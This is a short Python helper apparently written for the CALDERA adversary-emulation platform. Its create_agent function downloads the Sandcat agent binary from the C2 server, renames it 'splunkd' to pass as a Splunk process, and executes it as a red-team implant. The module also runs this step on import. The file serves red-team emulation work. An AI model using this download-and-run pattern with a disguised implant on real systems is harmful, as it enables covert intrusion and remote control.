'''
responsible for api calls to caldera and processing outputs
'''
import os
import subprocess
import requests
from dotenv import load_dotenv
load_dotenv()

#for wnen we add these to the env file
CALDERA_URL = os.getenv("CALDERA_URL", "http://localhost:8888")
API_KEY     = os.getenv("CALDERA_API_KEY")
HEADERS     = {"KEY": API_KEY, "Content-Type": "application/json"}
# Agents
def create_agent():
	url = f"{CALDERA_URL}/file/download"
	headers={
		"file":"sandcat.go",
		"platform":"linux"
}
	try:
		with requests.post(url,headers=headers,stream=True) as response:
			response.raise_for_status()
			with open ("splunkd", "wb") as f:
				for chunk in response.iter_content(chunk_size=8192):
					if chunk:
						f.write(chunk)
		os.chmod("splunkd",0o755)
		subprocess.Popen([
			"./splunkd",
			"-server", CALDERA_URL,
			"-group", "red",
			"-v"
])
	except Exception:
		return "False"
# Abilities

# Adversaries (work in progress)


# Operations


#Health
def health_check():
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/health", headers=HEADERS, timeout=7)
        return r.status_code == 200
    except Exception:
        return False


create_agent()
